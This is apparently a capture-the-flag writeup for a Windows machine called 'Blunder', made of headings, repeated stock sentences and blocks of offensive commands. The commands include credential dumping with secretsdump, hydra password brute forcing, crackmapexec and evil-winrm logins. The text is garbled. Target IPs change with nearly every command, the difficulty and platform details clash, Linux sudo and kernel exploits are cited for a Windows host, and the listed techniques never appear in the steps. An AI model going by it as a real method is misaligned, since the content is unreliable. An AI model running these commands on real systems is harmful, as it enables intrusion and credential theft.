---
TitleSEO: "TryHackMe — Blunder (Hard Windows) | ZureFX"
TitlePost: "TryHackMe — Blunder (Hard Windows)"
Author: "ZureFX"
Description: "Full writeup for TryHackMe Blunder. Resource-Based Constrained Delegation and SQL Injection to achieve hard compromise on Windows."
Keywords: "offsec, medium, active directory, windows, tryhackme"
URL: "https://zurefx.github.io/writeups/htb-blunder-446.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-blunder-446/"
Date: "2024-02-01"
Tags: "OffSec, Medium, Active Directory, Windows, TryHackMe"
Section: "writeups"
Lang: "en"
main_img: "htb-blunder-446"
Permalink: "/writeups/htb-blunder-446.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Blunder** is rated **Hard** on TryHackMe. It runs **Windows** and the IP address during this analysis was `10.78.195.189`.

### Objectives

Initial enumeration revealed several interesting open ports on the target. Token impersonation allowed elevation to SYSTEM privileges on the target.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
crackmapexec smb 10.76.8.91 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.32.33.206
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.25.23.30/FUZZ
```

The kernel version was outdated and vulnerable to a publicly known exploit. The web application was vulnerable to Server-Side Template Injection (SSTI).

### Service Enumeration

Post-exploitation enumeration revealed a path to domain administrator privileges. Group Policy Preferences contained encrypted but recoverable credentials. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.98.69.86
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.14.123.122/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.86.74.82/FUZZ
```

The service was running without proper input validation, leading to injection vulnerabilities. The backup files contained sensitive information that should not have been accessible.

### SMB Enumeration

Lateral movement was facilitated by reusing discovered credentials across services. Initial enumeration revealed several interesting open ports on the target.

```bash
gobuster dir -u http://10.67.87.109/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
gobuster dir -u http://10.34.213.42/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Initial enumeration revealed several interesting open ports on the target. The application stored sensitive credentials in an unencrypted configuration file. The target system was identified as running a vulnerable version of the service.

## Exploitation

### Vulnerability Identification

Weak file permissions allowed modification of critical system files. The service was running without proper input validation, leading to injection vulnerabilities. Lateral movement was facilitated by reusing discovered credentials across services.

Key finding: **Pass the Ticket**.

The backup files contained sensitive information that should not have been accessible. Post-exploitation enumeration revealed a path to domain administrator privileges.

### Initial Access

Network traffic analysis revealed unencrypted communications containing user credentials. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
nmap -sCV -p1433,3389,993 10.107.62.109 -oN scan.txt
crackmapexec smb 10.22.201.245 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.128.177.110/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Post-exploitation enumeration revealed a path to domain administrator privileges. The service was running without proper input validation, leading to injection vulnerabilities. The backup files contained sensitive information that should not have been accessible.

## Privilege Escalation

### Enumeration

The web application was vulnerable to Server-Side Template Injection (SSTI). The kernel version was outdated and vulnerable to a publicly known exploit. The service account had excessive permissions assigned in Active Directory.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.105.140.136
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.16.1.62/FUZZ
gobuster dir -u http://10.21.5.178/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
gobuster dir -u http://10.22.194.32/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

### Exploitation

The web application was vulnerable to Server-Side Template Injection (SSTI). Unconstrained delegation was enabled on the compromised machine.

```powershell
feroxbuster -h
evil-winrm -i 10.26.199.35 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.87.243.214 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p5985,1433,3268 10.46.139.46 -oN scan.txt
```

Privilege escalation was possible due to misconfigured sudo permissions. Group Policy Preferences contained encrypted but recoverable credentials.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The service account had excessive permissions assigned in Active Directory. The database credentials were hardcoded in the application source code.

## Summary

### Tools Used

- `GetNPUsers`
- `bloodhound`
- `john`
- `rubeus`
- `gobuster`

### Key Takeaways

- Resource-Based Constrained Delegation
- SQL Injection
- CORS Misconfiguration
- Pass the Ticket
